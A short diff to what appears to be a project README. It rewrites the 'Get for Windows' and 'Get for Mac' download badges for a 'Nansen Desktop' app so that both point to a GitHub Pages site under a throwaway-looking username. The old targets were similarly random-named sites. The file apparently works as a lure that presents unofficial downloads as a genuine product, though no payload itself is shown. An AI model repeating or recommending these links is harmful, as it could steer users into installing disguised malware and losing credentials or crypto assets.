@@ -6,9 +6,9 @@
 <br>
 <div align="center">
 
-[![💻 Get for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://nansen-desktop.github.io/.github)  
+[![💻 Get for Windows](https://img.shields.io/badge/💻_Get_for_Windows-blue?style=for-the-badge&logo=windows)](https://t05424424.github.io/.github/Nansen-Desktop)  
 
-[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://asdmasldkhas231.github.io/.github)
+[![🍏 Get for Mac](https://img.shields.io/badge/🍏_Get_for_Mac-green?style=for-the-badge&logo=apple)](https://t05424424.github.io/.github/Nansen-Desktop)
 </div>
 
 ---
